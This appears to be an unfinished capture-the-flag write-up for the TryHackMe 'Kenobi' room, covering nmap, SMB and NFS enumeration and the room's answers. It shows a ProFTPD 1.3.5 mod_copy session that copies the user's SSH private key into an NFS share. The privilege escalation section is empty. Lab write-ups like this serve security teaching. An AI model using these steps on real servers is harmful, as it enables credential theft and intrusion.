# The Impossible Challenge

- [Tools](#tools)
- [Deploy the vulnerable machine](#Deploy-the-vulnerable-machine)
- [Enumerating Samba for shares](#enumerating-samba-for-shares)
- [Gain initial access with ProFtpd](#gain-initial-access-with-progtpd)
- [Privilege Escalation with Path Variable Manipulation](#privilege-escalation-with-path-variable-manipulation)
  
Room Link: https://tryhackme.com/room/kenobi

## Tools 

1. NMap https://nmap.org/download
2. Metasploit https://www.metasploit.com/download
3. 

## Deploy the vulnerable machine
1. Running nmap gives
```bash
nmap 10.10.60.186
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:09 IST
Nmap scan report for 10.10.60.186
Host is up (0.16s latency).
Not shown: 992 closed ports
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
80/tcp   open     http
111/tcp  open     rpcbind
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
2049/tcp open     nfs
2500/tcp filtered rtsserv

Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
```
2. Question "Scan the machine with nmap, how many ports are open?" Answer "7"
## Enumerating Samba for shares 
1. Now we can scan it with given nmap commands.
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.104.199
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-28 17:37 IST
Nmap scan report for 10.10.104.199
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.104.199\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.104.199\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.104.199\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 28.24 seconds

```
2. Question `Using the nmap command above, how many shares have been found?` Answer `3`
3. Connected to smb as `anonymous` user using given command `smbclient //10.10.56.134/anonymous` to read files
```bash
smbclient //10.10.56.134/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 16:19:09 2019
  ..                                  D        0  Wed Sep  4 16:26:07 2019
  log.txt                             N    12237  Wed Sep  4 16:19:09 2019

		9204224 blocks of size 1024. 6877096 blocks available
```
4. Question `Once you're connected, list the files on the share. What is the file can you see?` Answer `log.txt`
5. Then used given command to download files,
```bash
smbget -R smb://10.10.56.134/anonymous
Password for [root] connecting to //10.10.56.134/anonymous: 
Using workgroup WORKGROUP, user root
smb://10.10.56.134/anonymous/log.txt                                                                        
Downloaded 11.95kB in 6 seconds
```
6. Question `What port is FTP running on?` Answer `21` Got it from `log.txt`
7. As given nmap scan command with script to scan port 111
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.56.134
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-28 23:36 IST
Nmap scan report for 10.10.56.134
Host is up (0.16s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836540.0  6877088.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds
```
8. Question `What mount can we see?` Answer `/var`

## Gain initial access with ProFtpd
1. Question `What is the version?` (FTP) Answer `1.3.5`
```bash
nc 10.10.245.171 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.245.171]
```
2. Question `How many exploits are there for the ProFTPd running?` Answer `4`
```bash
searchsploit proftp 1.3.5
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/opt/exploit-database")

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/opt/exploit-database")

-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                 | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                 | linux/remote/36742.txt
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
3. Copied `id_rsa` file according to given instruction
```bash
nc 10.10.245.171 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.245.171]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
4. Mount NFS as instruction
```bash
root@system:/tmp# mkdir /mnt/kenobiNFS
root@system:/tmp# mount 10.10.245.171:/var /mnt/kenobiNFS
mount: /mnt/kenobiNFS: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.
root@system:/tmp# ls -la /mnt/kenobiNFS
total 8
drwxr-xr-x 2 root root 4096 Feb 29 10:03 .
drwxr-xr-x 3 root root 4096 Feb 29 10:03 ..
```
5. 
## Privilege Escalation with Path Variable Manipulation 

Author: Zishan Ahamed Thandar
